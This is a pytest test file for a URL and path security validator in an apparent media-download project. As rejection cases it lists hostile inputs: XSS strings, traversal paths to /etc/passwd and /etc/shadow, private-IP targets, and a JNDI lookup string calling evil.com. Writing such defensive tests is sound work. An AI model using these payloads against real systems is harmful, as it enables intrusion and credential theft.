"""Unit tests for security validation utilities."""

import pytest
from src.utils.security import SecurityValidator


class TestSecurityValidator:
    
    def test_validate_valid_url(self):
        """Test validation of valid URLs."""
        urls = [
            "https://www.youtube.com/watch?v=test123",
            "https://youtu.be/test123",
            "https://vt.tiktok.com/ZS593uwQc/",
            "https://www.instagram.com/p/test/"
        ]
        
        for url in urls:
            is_valid, error = SecurityValidator.validate_url(url)
            assert is_valid, f"URL should be valid: {url} - Error: {error}"
            assert error == ""
    
    def test_validate_invalid_protocols(self):
        """Test rejection of dangerous protocols."""
        invalid_urls = [
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('test')"
        ]
        
        for url in invalid_urls:
            is_valid, error = SecurityValidator.validate_url(url)
            assert not is_valid, f"URL should be rejected: {url}"
            assert "dangerous protocol" in error.lower()
    
    def test_validate_private_ips(self):
        """Test rejection of private IP addresses."""
        private_urls = [
            "https://127.0.0.1/test",
            "https://10.0.0.1/test",
            "https://192.168.1.1/test",
            "https://localhost/test"
        ]
        
        for url in private_urls:
            is_valid, error = SecurityValidator.validate_url(url)
            assert not is_valid, f"Private IP URL should be rejected: {url}"
            assert "private" in error.lower() or "localhost" in error.lower()
    
    def test_validate_unsupported_domains(self):
        """Test rejection of unsupported domains."""
        unsupported_urls = [
            "https://malicious-site.com/video",
            "https://hacker.example.com/content",
            "https://random-website.org/media"
        ]
        
        for url in unsupported_urls:
            is_valid, error = SecurityValidator.validate_url(url)
            assert not is_valid, f"Unsupported domain should be rejected: {url}"
            assert "allowed list" in error.lower()
    
    def test_contains_suspicious_patterns(self):
        """Test detection of suspicious patterns."""
        suspicious_urls = [
            "https://example.com/../etc/passwd",
            "https://example.com/path%2e%2e/etc/shadow",
            "https://example.com/<script>alert('xss')</script>",
            "https://example.com/${jndi:ldap://evil.com/test}"
        ]
        
        for url in suspicious_urls:
            is_valid, error = SecurityValidator.validate_url(url)
            assert not is_valid, f"Suspicious URL should be rejected: {url}"
            assert "suspicious" in error.lower()
    
    def test_sanitize_filename(self):
        """Test filename sanitization."""
        test_cases = [
            ("normal_file.mp4", "normal_file.mp4"),
            ("../etc/passwd", "_etc_passwd"),
            ("file with spaces.mp4", "file with spaces.mp4"),
            ("file<named>.mp4", "file_named_.mp4"),
            ("", "unnamed_file"),
            (None, "unnamed_file")
        ]
        
        for input_filename, expected in test_cases:
            result = SecurityValidator.sanitize_filename(input_filename)
            assert result == expected
    
    def test_validate_media_path(self):
        """Test media path validation."""
        base_path = "/safe/media"
        
        # Valid paths
        valid_paths = ["video.mp4", "subfolder/image.jpg"]
        for path in valid_paths:
            is_valid, error = SecurityValidator.validate_media_path(base_path, path)
            assert is_valid, f"Valid path should be accepted: {path}"
            assert error == ""
        
        # Invalid paths (path traversal)
        invalid_paths = ["../etc/passwd", "../../system/file"]
        for path in invalid_paths:
            is_valid, error = SecurityValidator.validate_media_path(base_path, path)
            assert not is_valid, f"Path traversal should be rejected: {path}"
            assert "traversal" in error.lower()
    
    def test_security_headers(self):
        """Test security headers generation."""
        headers = SecurityValidator.get_security_headers()
        
        expected_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options', 
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy'
        ]
        
        for header in expected_headers:
            assert header in headers
            assert isinstance(headers[header], str)
            assert len(headers[header]) > 0


if __name__ == "__main__":
    pytest.main([__file__])